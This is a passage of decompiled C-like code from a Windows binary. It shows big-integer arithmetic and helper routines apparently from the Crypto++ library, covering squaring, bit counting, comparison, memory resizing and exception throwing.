  *((_QWORD *)&v11 + 1) = (unsigned __int64)(*((_QWORD *)&v26 + 1) + (*v2 * (unsigned __int128)v2[4] >> 64)) < *((_QWORD *)&v26 + 1);
  *(_QWORD *)&v11 = *((_QWORD *)&v26 + 1) + (*v2 * (unsigned __int128)v2[4] >> 64);
  v27 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = *((_QWORD *)&v26 + 1) + (*v2 * (unsigned __int128)v2[4] >> 64);
  *(_QWORD *)&v11 = v26;
  v28 = 2 * v26;
  v29 = v2[2] * (unsigned __int128)v2[2];
  *(_QWORD *)&v29 = v28 + v29;
  *((_QWORD *)&v29 + 1) += (unsigned __int64)v29 < v28;
  v30 = v29 + v23;
  v31 = *((_QWORD *)&v29 + 1) + (unsigned __int128)(v11 >> 63);
  v3[4] = v30;
  v32 = (v30 < (unsigned __int64)v29) + v24 + v21;
  v33 = v31 + v32;
  v34 = (v31 < *((_QWORD *)&v29 + 1)) + (v31 + v32 < v32) + v27;
  v35 = *v2 * v2[5];
  v36 = v2[1] * (unsigned __int128)v2[4];
  v37 = v35 + v36;
  *((_QWORD *)&v36 + 1) += v35 + (unsigned __int64)v36 < v35;
  v38 = *((_QWORD *)&v36 + 1) + (*v2 * (unsigned __int128)v2[5] >> 64);
  v39 = v38 < *((_QWORD *)&v36 + 1);
  v40 = v2[2] * (unsigned __int128)v2[3];
  *(_QWORD *)&v40 = v37 + v40;
  *((_QWORD *)&v40 + 1) += (unsigned __int64)v40 < v37;
  v41 = v33 + 2 * v40;
  v42 = *((_QWORD *)&v40 + 1) + v38;
  v3[5] = v41;
  *((_QWORD *)&v11 + 1) = (v42 < *((_QWORD *)&v40 + 1)) + v39;
  *(_QWORD *)&v11 = v42;
  v43 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v42;
  *(_QWORD *)&v11 = v40;
  v44 = (v41 < 2 * (signed __int64)v40) + v34;
  v45 = (unsigned __int128)(v11 >> 63) + v44;
  v24 = v45 < v44;
  v46 = *v2 * v2[6];
  v47 = v2[1] * (unsigned __int128)v2[5];
  v48 = v46 + v47;
  *((_QWORD *)&v47 + 1) += v46 + (unsigned __int64)v47 < v46;
  v49 = *((_QWORD *)&v47 + 1) + (*v2 * (unsigned __int128)v2[6] >> 64);
  v50 = v49 < *((_QWORD *)&v47 + 1);
  v51 = v2[2] * (unsigned __int128)v2[4];
  *(_QWORD *)&v51 = v48 + v51;
  *((_QWORD *)&v51 + 1) += (unsigned __int64)v51 < v48;
  v52 = 2 * v51;
  v53 = *((_QWORD *)&v51 + 1) + v49;
  *((_QWORD *)&v11 + 1) = (v53 < *((_QWORD *)&v51 + 1)) + v50;
  *(_QWORD *)&v11 = v53;
  v54 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v53;
  *(_QWORD *)&v11 = v51;
  v55 = v2[3] * (unsigned __int128)v2[3];
  *(_QWORD *)&v55 = v52 + v55;
  *((_QWORD *)&v55 + 1) += (unsigned __int64)v55 < v52;
  v56 = v55 + v45;
  v57 = *((_QWORD *)&v55 + 1) + (unsigned __int128)(v11 >> 63);
  v58 = (v56 < (unsigned __int64)v55) + v24 + v43;
  v59 = v57 + v58;
  v3[6] = v56;
  v60 = (v57 < *((_QWORD *)&v55 + 1)) + (v57 + v58 < v58) + v54;
  v61 = *v2 * v2[7];
  v62 = v2[1] * (unsigned __int128)v2[6];
  v63 = v61 + v62;
  *((_QWORD *)&v62 + 1) += v61 + (unsigned __int64)v62 < v61;
  v64 = *((_QWORD *)&v62 + 1) + (*v2 * (unsigned __int128)v2[7] >> 64);
  v65 = v64 < *((_QWORD *)&v62 + 1);
  v66 = v2[2] * (unsigned __int128)v2[5];
  v67 = v63 + v66;
  *((_QWORD *)&v66 + 1) += v63 + (unsigned __int64)v66 < v63;
  v68 = *((_QWORD *)&v66 + 1) + v64;
  v69 = (v68 < *((_QWORD *)&v66 + 1)) + v65;
  v70 = v2[3] * (unsigned __int128)v2[4];
  *(_QWORD *)&v70 = v67 + v70;
  *((_QWORD *)&v70 + 1) += (unsigned __int64)v70 < v67;
  v71 = v59 + 2 * v70;
  v72 = *((_QWORD *)&v70 + 1) + v68;
  v3[7] = v71;
  *((_QWORD *)&v11 + 1) = (v72 < *((_QWORD *)&v70 + 1)) + v69;
  *(_QWORD *)&v11 = v72;
  v73 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v72;
  *(_QWORD *)&v11 = v70;
  v74 = (v71 < 2 * (signed __int64)v70) + v60;
  v75 = (unsigned __int128)(v11 >> 63) + v74;
  v24 = v75 < v74;
  v76 = v2[1] * v2[7];
  v77 = v2[2] * (unsigned __int128)v2[6];
  v78 = v76 + v77;
  *((_QWORD *)&v77 + 1) += v76 + (unsigned __int64)v77 < v76;
  v79 = *((_QWORD *)&v77 + 1) + (v2[1] * (unsigned __int128)v2[7] >> 64);
  v80 = v79 < *((_QWORD *)&v77 + 1);
  v81 = v2[3] * (unsigned __int128)v2[5];
  *(_QWORD *)&v81 = v78 + v81;
  *((_QWORD *)&v81 + 1) += (unsigned __int64)v81 < v78;
  v82 = 2 * v81;
  v83 = *((_QWORD *)&v81 + 1) + v79;
  *((_QWORD *)&v11 + 1) = (v83 < *((_QWORD *)&v81 + 1)) + v80;
  *(_QWORD *)&v11 = v83;
  v84 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v83;
  *(_QWORD *)&v11 = v81;
  v85 = v2[4] * (unsigned __int128)v2[4];
  *(_QWORD *)&v85 = v82 + v85;
  *((_QWORD *)&v85 + 1) += (unsigned __int64)v85 < v82;
  v86 = v85 + v75;
  v87 = *((_QWORD *)&v85 + 1) + (unsigned __int128)(v11 >> 63);
  v88 = (v86 < (unsigned __int64)v85) + v24 + v73;
  v89 = v87 + v88;
  v90 = (v87 < *((_QWORD *)&v85 + 1)) + (v87 + v88 < v88) + v84;
  v3[8] = v86;
  v91 = v2[2] * v2[7];
  v92 = v2[3] * (unsigned __int128)v2[6];
  v93 = v91 + v92;
  *((_QWORD *)&v92 + 1) += v91 + (unsigned __int64)v92 < v91;
  v94 = *((_QWORD *)&v92 + 1) + (v2[2] * (unsigned __int128)v2[7] >> 64);
  v95 = v94 < *((_QWORD *)&v92 + 1);
  v96 = v2[4] * (unsigned __int128)v2[5];
  *(_QWORD *)&v96 = v93 + v96;
  *((_QWORD *)&v96 + 1) += (unsigned __int64)v96 < v93;
  v97 = v89 + 2 * v96;
  v98 = *((_QWORD *)&v96 + 1) + v94;
  v3[9] = v97;
  *((_QWORD *)&v11 + 1) = (v98 < *((_QWORD *)&v96 + 1)) + v95;
  *(_QWORD *)&v11 = v98;
  v99 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v98;
  *(_QWORD *)&v11 = v96;
  v100 = (v97 < 2 * (signed __int64)v96) + v90;
  v101 = (unsigned __int128)(v11 >> 63) + v100;
  v102 = (v101 < v100) + v99;
  v103 = v2[3] * v2[7];
  v104 = v2[4] * (unsigned __int128)v2[6];
  *(_QWORD *)&v104 = v103 + v104;
  *((_QWORD *)&v104 + 1) += (unsigned __int64)v104 < v103;
  v105 = 2 * v104;
  *((_QWORD *)&v11 + 1) = (unsigned __int64)(*((_QWORD *)&v104 + 1) + (v2[3] * (unsigned __int128)v2[7] >> 64)) < *((_QWORD *)&v104 + 1);
  *(_QWORD *)&v11 = *((_QWORD *)&v104 + 1) + (v2[3] * (unsigned __int128)v2[7] >> 64);
  v106 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = *((_QWORD *)&v104 + 1) + (v2[3] * (unsigned __int128)v2[7] >> 64);
  *(_QWORD *)&v11 = v104;
  v107 = v2[5] * (unsigned __int128)v2[5];
  *(_QWORD *)&v107 = v105 + v107;
  *((_QWORD *)&v107 + 1) += (unsigned __int64)v107 < v105;
  v108 = v107 + v101;
  v109 = *((_QWORD *)&v107 + 1) + (unsigned __int128)(v11 >> 63);
  v3[10] = v108;
  v110 = (v108 < (unsigned __int64)v107) + v102;
  v111 = (v109 < *((_QWORD *)&v107 + 1)) + (v109 + v110 < v110) + v106;
  v112 = v2[4] * v2[7];
  v113 = v2[5] * (unsigned __int128)v2[6];
  *(_QWORD *)&v113 = v112 + v113;
  *((_QWORD *)&v113 + 1) += (unsigned __int64)v113 < v112;
  v114 = v109 + v110 + 2 * v113;
  *((_QWORD *)&v11 + 1) = (unsigned __int64)(*((_QWORD *)&v113 + 1) + (v2[4] * (unsigned __int128)v2[7] >> 64)) < *((_QWORD *)&v113 + 1);
  *(_QWORD *)&v11 = *((_QWORD *)&v113 + 1) + (v2[4] * (unsigned __int128)v2[7] >> 64);
  v115 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = *((_QWORD *)&v113 + 1) + (v2[4] * (unsigned __int128)v2[7] >> 64);
  *(_QWORD *)&v11 = v113;
  v3[11] = v114;
  v116 = (v114 < 2 * (signed __int64)v113) + v111;
  v117 = (unsigned __int128)(v11 >> 63) + v116;
  v24 = v117 < v116;
  v118 = (signed __int128)(v2[5] * (unsigned __int128)v2[7] >> 64) >> 63;
  v119 = v2[5] * (unsigned __int128)v2[7];
  v120 = v2[6] * (unsigned __int128)v2[6];
  *(_QWORD *)&v120 = 2 * v119 + v120;
  *((_QWORD *)&v120 + 1) += (unsigned __int64)v120 < 2 * (signed __int64)v119;
  v121 = v120 + v117;
  v122 = *((_QWORD *)&v120 + 1) + (unsigned __int128)(v119 >> 63);
  v3[12] = v121;
  v123 = (v121 < (unsigned __int64)v120) + v24 + v115;
  v124 = (v122 < *((_QWORD *)&v120 + 1)) + (v122 + v123 < v123) + v118;
  *(_QWORD *)&v120 = v2[6] * v2[7];
  *(_QWORD *)&v119 = v2[6] * (unsigned __int128)v2[7] >> 64;
  *((_QWORD *)&v120 + 1) = (signed __int128)(v2[6] * (unsigned __int128)v2[7]) >> 63;
  v125 = v122 + v123 + 2 * v120;
  v3[13] = v125;
  v126 = (v125 < 2 * (signed __int64)v120) + v124;
  v127 = *((_QWORD *)&v120 + 1) + v126;
  v128 = v2[7] * (unsigned __int128)v2[7];
  result = v127 + v128;
  v3[14] = result;
  v3[15] = (v127 < v126)
         + (unsigned __int64)((signed __int128)(unsigned __int64)v119 >> 63)
         + (result < v127)
         + *((_QWORD *)&v128 + 1);
  return result;
}

//----- (0000000140045340) ----------------------------------------------------
__int64 __fastcall sub_140045340(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // r10
  _QWORD *v3; // rcx
  __int64 v4; // r9
  unsigned int v5; // edx
  unsigned __int64 v6; // r10
  unsigned int v7; // er8

  v1 = *(_QWORD *)(a1 + 16);
  v2 = *(_QWORD *)(a1 + 24);
  if ( v1 )
  {
    v3 = (_QWORD *)(v2 + 8 * (v1 - 1));
    do
    {
      if ( *v3 )
        break;
      --v3;
      --v1;
    }
    while ( v1 );
  }
  if ( !(_DWORD)v1 )
    return 0i64;
  v4 = (unsigned int)(v1 - 1);
  v5 = 0;
  v6 = *(_QWORD *)(v2 + 8 * v4);
  if ( v6 )
  {
    v7 = 0;
    v5 = 64;
    do
    {
      if ( v6 >> ((v5 + v7) >> 1) )
        v7 = (v5 + v7) >> 1;
      else
        v5 = (v5 + v7) >> 1;
    }
    while ( v5 - v7 > 1 );
  }
  return v5 + ((_DWORD)v4 << 6);
}

//----- (00000001400453B0) ----------------------------------------------------
signed __int64 sub_1400453B0()
{
  return 64i64;
}

//----- (00000001400453C0) ----------------------------------------------------
__int64 __fastcall sub_1400453C0(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // r9
  _QWORD *v3; // rcx
  __int64 v4; // r10
  unsigned int v5; // edx
  unsigned __int64 v6; // r9
  unsigned int v7; // er8
  unsigned int v8; // edx

  v1 = *(_QWORD *)(a1 + 16);
  v2 = *(_QWORD *)(a1 + 24);
  if ( v1 )
  {
    v3 = (_QWORD *)(v2 + 8 * (v1 - 1));
    do
    {
      if ( *v3 )
        break;
      --v3;
      --v1;
    }
    while ( v1 );
  }
  if ( !(_DWORD)v1 )
    return 0i64;
  v4 = (unsigned int)(v1 - 1);
  v5 = 0;
  v6 = *(_QWORD *)(v2 + 8 * v4);
  if ( v6 )
  {
    v7 = 0;
    v8 = 64;
    do
    {
      if ( v6 >> ((v8 + v7) >> 1) )
        v7 = (v8 + v7) >> 1;
      else
        v8 = (v8 + v7) >> 1;
    }
    while ( v8 - v7 > 8 );
    v5 = v8 >> 3;
  }
  return v5 + 8 * (_DWORD)v4;
}

//----- (0000000140045430) ----------------------------------------------------
__int64 __fastcall sub_140045430(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi

  v4 = a2;
  v5 = a1;
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 24i64))(a1, a3, a4);
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v5 + 40i64))(v5, v4);
}

//----- (0000000140045470) ----------------------------------------------------
__int64 __fastcall sub_140045470(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v5; // rbx
  __int64 v6; // rdi
  __int64 v7; // rsi

  v5 = a3;
  v6 = a2;
  v7 = a1;
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 24i64))(a1, a4, a5);
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v7 + 112i64))(v7, v6, v5);
}

//----- (0000000140045690) ----------------------------------------------------
void __noreturn sub_140045690()
{
  _QWORD *v0; // rbx
  __int64 (__fastcall **v1)(void *); // [rsp+30h] [rbp-78h]
  int v2; // [rsp+48h] [rbp-60h]
  char Dst; // [rsp+50h] [rbp-58h]
  __int64 v4; // [rsp+60h] [rbp-48h]
  __int64 v5; // [rsp+68h] [rbp-40h]
  void *Src; // [rsp+70h] [rbp-38h]
  unsigned __int64 v7; // [rsp+88h] [rbp-20h]

  v0 = sub_140048040(&Src);
  std::exception::exception((std::exception *)&v1);
  v1 = &off_1400A8798;
  v2 = 0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v1 = &off_1400A8798;
  if ( v7 >= 0x10 )
    operator delete(Src);
  v1 = &off_1400A8798;
  CxxThrowException(&v1, &_TI4_AUcls_077___cls_069_Vcls_023_CryptoPP___CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D4290: using guessed type int _TI4_AUcls_077___cls_069_Vcls_023_CryptoPP___CryptoPP__;

//----- (0000000140045750) ----------------------------------------------------
void __noreturn sub_140045750()
{
  _QWORD *v0; // rbx
  __int64 (__fastcall **v1)(void *); // [rsp+30h] [rbp-78h]
  int v2; // [rsp+48h] [rbp-60h]
  char Dst; // [rsp+50h] [rbp-58h]
  __int64 v4; // [rsp+60h] [rbp-48h]
  __int64 v5; // [rsp+68h] [rbp-40h]
  void *Src; // [rsp+70h] [rbp-38h]
  unsigned __int64 v7; // [rsp+88h] [rbp-20h]

  v0 = sub_140048040(&Src);
  std::exception::exception((std::exception *)&v1);
  v1 = &off_1400A8798;
  v2 = 0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v1 = &off_1400A8798;
  if ( v7 >= 0x10 )
    operator delete(Src);
  v1 = &off_1400A8798;
  CxxThrowException(&v1, &_TI4_AUcls_077___cls_069_Vcls_023_CryptoPP___CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D4290: using guessed type int _TI4_AUcls_077___cls_069_Vcls_023_CryptoPP___CryptoPP__;

//----- (0000000140045810) ----------------------------------------------------
void __fastcall sub_140045810(unsigned __int64 a1)
{
  char v1; // [rsp+28h] [rbp-80h]
  __int64 v2; // [rsp+38h] [rbp-70h]
  __int64 v3; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v4)(void *); // [rsp+50h] [rbp-58h]
  int v5; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v7; // [rsp+80h] [rbp-28h]
  __int64 v8; // [rsp+88h] [rbp-20h]

  if ( a1 > 0xFFFFFFFFFFFFFFFFui64 )
  {
    v3 = 15i64;
    v2 = 0i64;
    v1 = 0;
    sub_140004F20(&v1, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v4);
    v4 = &off_1400A8798;
    v5 = 1;
    v8 = 15i64;
    v7 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v1, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v4 = &off_1400A8798;
    CxxThrowException(&v4, &_TI3_AVcls_001_CryptoPP__);
  }
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (00000001400458E0) ----------------------------------------------------
void __fastcall sub_1400458E0(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  unsigned __int64 v3; // rbx
  __int64 v4; // rbp
  char *v5; // r14
  char *v6; // r15
  __int64 *v7; // rcx
  __int64 v8; // rax
  unsigned __int64 v9; // [rsp+50h] [rbp+8h]
  unsigned __int64 v10; // [rsp+58h] [rbp+10h]

  v2 = *(_QWORD *)(a1 + 8);
  v3 = a2;
  v4 = a1;
  if ( a2 > v2 )
  {
    v5 = *(char **)(a1 + 16);
    v9 = a2;
    v10 = v2;
    if ( v2 != a2 )
    {
      sub_140025670(a2);
      if ( v3 )
        v6 = (char *)sub_14003A000(8 * v3);
      else
        v6 = 0i64;
      v7 = (__int64 *)&v9;
      if ( v3 >= v2 )
        v7 = (__int64 *)&v10;
      if ( v5 )
      {
        if ( v6 )
          memcpy_s(v6, 8 * *v7, v5, 8 * *v7);
      }
      memset(v5, 0, 8 * v2);
      free(v5);
      v5 = v6;
    }
    v8 = *(_QWORD *)(v4 + 8);
    *(_QWORD *)(v4 + 16) = v5;
    memset(&v5[8 * v8], 0, 8 * (v3 - v8));
    *(_QWORD *)(v4 + 8) = v3;
  }
}

//----- (00000001400459C0) ----------------------------------------------------
_QWORD *__fastcall sub_1400459C0(__int64 a1)
{
  __int64 v1; // rdi
  _QWORD *v2; // rax
  _QWORD *v3; // rbx

  v1 = a1;
  v2 = operator new(0xC0ui64);
  v3 = v2;
  if ( !v2 )
    return 0i64;
  sub_14003B890((__int64)v2, v1);
  *v3 = &off_1400A9DA8;
  return v3;
}
// 1400A9DA8: using guessed type __int64 (__fastcall *off_1400A9DA8)(void *);

//----- (0000000140045A20) ----------------------------------------------------
signed __int64 __fastcall sub_140045A20(__int64 a1, __int64 a2, __int64 a3)
{
  signed __int64 v3; // rax
  __int64 v4; // r9
  unsigned __int64 v5; // rdx
  unsigned __int64 v6; // rcx

  if ( !a3 )
    return 0i64;
  v3 = a2 + 8 * a3;
  v4 = a1 - a2;
  while ( 1 )
  {
    v5 = *(_QWORD *)(v4 + v3 - 8);
    v6 = *(_QWORD *)(v3 - 8);
    v3 -= 8i64;
    --a3;
    if ( v5 > v6 )
      break;
    if ( v5 < v6 )
      return 0xFFFFFFFFi64;
    if ( !a3 )
      return 0i64;
  }
  return 1i64;
}

//----- (0000000140045A60) ----------------------------------------------------
signed __int64 __fastcall sub_140045A60(__int64 a1, __int64 a2)
{
  signed __int64 result; // rax

  if ( *(_DWORD *)(a1 + 32) == 1 )
  {
    if ( *(_DWORD *)(a2 + 32) == 1 )
      result = (unsigned int)-sub_14004A0B0(a1, a2);
    else
      result = 0xFFFFFFFFi64;
  }
  else if ( *(_DWORD *)(a2 + 32) == 1 )
  {
    result = 1i64;
  }
  else
  {
    result = sub_14004A0B0(a1, a2);
  }
  return result;
}

//----- (0000000140045AA0) ----------------------------------------------------
__int64 __fastcall sub_140045AA0(_QWORD *a1, __int64 a2, __int64 a3)
{
  char *v3; // rsi
  void *v4; // r15
  __int64 v5; // r14
  __int64 v6; // rbp
  __int64 v7; // rdx
  __int64 v8; // rdi
  char *v9; // r8
  _QWORD *v10; // rbx
  __int64 v11; // rax

  v3 = (char *)a1[25];
  v4 = (void *)a1[11];
  v5 = a1[5];
  v6 = a2;
  v7 = *(_QWORD *)(a3 + 16);
  v8 = a3;
  v9 = *(char **)(a3 + 24);
  v10 = a1;
  if ( v3 != v9 )
    memcpy_s(v3, 8 * v7, v9, 8 * v7);
  v11 = *(_QWORD *)(v8 + 16);
  if ( 2 * v5 != v11 )
    memset(&v3[8 * v11], 0, 8 * (2 * v5 - v11));
  sub_1400493F0(v4, (__int64)&v3[16 * v5], (__int64)v3, v10[6], v10[21], v5);
  sub_14003C000(v6, (__int64)(v10 + 8));
  return v6;
}

//----- (0000000140045B70) ----------------------------------------------------
__int64 __fastcall sub_140045B70(__int64 a1)
{
  __int64 result; // rax

  result = **(unsigned int **)(a1 + 24);
  if ( *(_DWORD *)(a1 + 32) )
    result = (unsigned int)-(signed int)result;
  return result;
}

//----- (0000000140045B80) ----------------------------------------------------
signed __int64 __fastcall sub_140045B80(__int64 a1, unsigned __int64 *a2, __int64 a3, __int64 a4, unsigned __int64 a5)
{
  __int64 v5; // rsi
  __int64 v6; // r15
  __int64 v7; // rbp
  _QWORD *v8; // rbx
  signed __int64 result; // rax
  bool v10; // zf

  v5 = (__int64)a2;
  v6 = a4;
  v7 = a1;
  v8 = (_QWORD *)a3;
  sub_14003E520(a2, (__int64)&a2[a5 + 2], a3, 2ui64, a4, a5);
  sub_140062F60(a5 + 2, v7, v7, v5);
  while ( 1 )
  {
    if ( !*(_QWORD *)(v7 + 8 * a5) )
    {
      result = sub_140045A20(v7, v6, a5);
      if ( (signed int)result < 0 )
        break;
    }
    *(_QWORD *)(v7 + 8 * a5) -= (signed int)sub_140062F60(a5, v7, v7, v6);
    v10 = (*v8)++ == -1i64;
    v8[1] += v10;
  }
  return result;
}

//----- (0000000140045C40) ----------------------------------------------------
void __fastcall sub_140045C40(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rax
  char v4; // [rsp+30h] [rbp-78h]

  v2 = a1;
  sub_14005F7E0((__int64)&v4, a2, 2);
  v3 = sub_140048F60(v2, 1);
  sub_140046F20(v2, &v4, v3, 1i64, -2i64);
  sub_1400609E0((__int64)&v4);
  sub_14005F8B0((__int64)&v4);
}

//----- (0000000140045CD0) ----------------------------------------------------
void __fastcall sub_140045CD0(__int64 a1, __int64 a2, unsigned __int64 a3, int a4)
{
  __int64 v4; // rsi
  __int64 v5; // r14
  int v6; // ebx
  unsigned __int64 v7; // rdi
  unsigned __int8 v8; // cl
  BOOL v9; // eax
  int v10; // eax
  bool v11; // zf
  signed __int64 v12; // rax
  void *v13; // rcx
  unsigned __int64 v14; // rbx
  unsigned __int64 v15; // rbp
  _QWORD *v16; // rdx
  char v17; // cl
  _QWORD *v18; // rdx
  char v19; // cl
  unsigned __int8 v20; // [rsp+58h] [rbp+20h]

  v4 = a1;
  v5 = a2;
  v6 = a4;
  v7 = a3;
  (*(void (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)a2 + 160i64))(a2, &v20);
  v8 = v20;
  v9 = v6 == 1 && (v20 & 0x80u) != 0;
  *(_DWORD *)(v4 + 32) = v9;
  if ( v7 )
  {
    while ( 1 )
    {
      v10 = 0;
      v11 = *(_DWORD *)(v4 + 32) ? v8 == -1 : v8 == 0;
      LOBYTE(v10) = v11;
      if ( !v10 )
        break;
      (*(void (__fastcall **)(__int64, signed __int64))(*(_QWORD *)v5 + 168i64))(v5, 1i64);
      (*(void (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)v5 + 160i64))(v5, &v20);
      if ( !--v7 )
        break;
      v8 = v20;
    }
  }
  v12 = sub_14004B580((v7 + 7) >> 3);
  sub_140049D90(v4 + 8, v12);
  v13 = *(void **)(v4 + 24);
  if ( v13 )
    memset(v13, 0, 8i64 * *(_QWORD *)(v4 + 16));
  if ( v7 )
  {
    v14 = v7 - 1;
    v15 = v7;
    do
    {
      (*(void (__fastcall **)(__int64, unsigned __int8 *))(*(_QWORD *)v5 + 144i64))(v5, &v20);
      v16 = (_QWORD *)(*(_QWORD *)(v4 + 24) + 8 * (v14 >> 3));
      v17 = v14-- & 7;
      *v16 |= (unsigned __int64)v20 << 8 * v17;
      --v15;
    }
    while ( v15 );
  }
  if ( *(_DWORD *)(v4 + 32) == 1 )
  {
    for ( ; v7 < 8i64 * *(_QWORD *)(v4 + 16); *v18 |= 255i64 << 8 * v19 )
    {
      v18 = (_QWORD *)(*(_QWORD *)(v4 + 24) + 8 * (v7 >> 3));
      v19 = v7++ & 7;
    }
    sub_14004C0B0(*(unsigned __int64 **)(v4 + 24), *(_QWORD *)(v4 + 16));
  }
}

//----- (0000000140045E60) ----------------------------------------------------
char *__fastcall sub_140045E60(__int64 a1, __int64 a2, char a3, int a4, int a5)
{
  int v5; // er14
  char v6; // bp
  __int64 v7; // rsi
  __int64 v8; // rbx
  char *v9; // rdi
  __int64 i; // rcx
  char *result; // rax
  char *v12; // rdi
  __int64 j; // rcx
  __int64 (__fastcall **v14)(void *); // [rsp+58h] [rbp-F0h]
  __int64 v15; // [rsp+60h] [rbp-E8h]
  char v16; // [rsp+68h] [rbp-E0h]
  char v17; // [rsp+A9h] [rbp-9Fh]
  __int64 v18; // [rsp+B0h] [rbp-98h]
  char *v19; // [rsp+B8h] [rbp-90h]
  char v20; // [rsp+C0h] [rbp-88h]
  char v21; // [rsp+101h] [rbp-47h]
  __int64 v22; // [rsp+108h] [rbp-40h]
  char *v23; // [rsp+110h] [rbp-38h]

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  sub_140036DA0((__int64)&v14, 1);
  v15 = 0i64;
  v18 = 16i64;
  v17 = 1;
  v19 = &v16;
  v22 = 16i64;
  v21 = 1;
  v23 = &v20;
  sub_140061C50(&v20);
  v14 = &off_1400A9DA8;
  sub_140060FF0((__int64)&v14, v8, v7, v6, v5, a5);
  v9 = v23;
  if ( v23 == &v20 )
  {
    for ( i = v22; i; --i )
    {
      *(_DWORD *)v9 = 0;
      v9 += 4;
    }
  }
  result = &v16;
  v12 = v19;
  if ( v19 == &v16 )
  {
    result = 0i64;
    for ( j = v18; j; --j )
    {
      *(_DWORD *)v12 = 0;
      v12 += 4;
    }
  }
  return result;
}
// 140060FF0: using guessed type __int64 __fastcall sub_140060FF0(__int64, __int64, __int64, char, _DWORD, _DWORD);
// 1400A9DA8: using guessed type __int64 (__fastcall *off_1400A9DA8)(void *);

//----- (0000000140045FB0) ----------------------------------------------------
__int64 __fastcall sub_140045FB0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rax
  __int64 v5; // rbx
  void *v6; // rdx
  char v8; // [rsp+28h] [rbp-30h]
  __int64 v9; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v3 = a1;
  v4 = sub_140024770((__int64)&v8, a2, a3);
  v5 = sub_14003C670(v3 + 64, v4);
  v6 = Memory;
  memset(Memory, 0, 8 * v9);
  free(v6);
  return v5;
}

//----- (0000000140046010) ----------------------------------------------------
char *__fastcall sub_140046010(char *a1, __int64 a2, _QWORD *a3, _QWORD *a4, rsize_t a5, _QWORD *Src, unsigned __int64 a7)
{
  unsigned __int64 v7; // rbx
  __int64 v8; // rsi
  _QWORD *v9; // r12
  signed __int64 v10; // rdi
  _QWORD *v11; // r15
  bool v12; // zf
  signed __int64 v13; // r13
  unsigned __int64 v14; // r9
  unsigned int v15; // edx
  unsigned int v16; // er8
  unsigned __int64 v17; // r9
  int v18; // edi
  unsigned __int64 v19; // r8
  unsigned __int64 v20; // rdx
  rsize_t v21; // r14
  unsigned __int64 v22; // r9
  unsigned __int64 v23; // r8
  unsigned __int64 v24; // rdx
  _QWORD *v25; // r15
  __int64 v26; // rbp
  unsigned __int64 v27; // rcx
  signed __int64 v28; // rax
  unsigned __int64 v29; // rdx
  unsigned __int64 v30; // r8
  unsigned __int64 v31; // r13
  rsize_t v32; // r14
  signed __int64 v33; // rbp
  unsigned __int64 v34; // r15
  unsigned __int64 *v35; // rdi
  rsize_t v36; // r10
  signed __int64 v37; // rbp
  unsigned __int64 v38; // rax
  unsigned __int64 v39; // r12
  __int64 v40; // rdx
  unsigned __int64 *v41; // r8
  char *result; // rax
  char *v43; // r8
  unsigned __int64 v44; // rdx
  unsigned __int64 *v45; // [rsp+30h] [rbp-78h]
  __int64 v46; // [rsp+38h] [rbp-70h]
  __int64 v47; // [rsp+40h] [rbp-68h]
  unsigned __int64 v48; // [rsp+48h] [rbp-60h]
  unsigned __int64 v49; // [rsp+50h] [rbp-58h]
  char *Dst; // [rsp+B0h] [rbp+8h]
  __int64 v51; // [rsp+B8h] [rbp+10h]
  rsize_t v52; // [rsp+B8h] [rbp+10h]
  _QWORD *v53; // [rsp+C0h] [rbp+18h]
  __int64 v54; // [rsp+C8h] [rbp+20h]
  char *Srca; // [rsp+D8h] [rbp+30h]
  int v56; // [rsp+E0h] [rbp+38h]

  v53 = a3;
  v51 = a2;
  Dst = a1;
  v7 = a7;
  v8 = 0i64;
  v9 = &a3[a5 + 2];
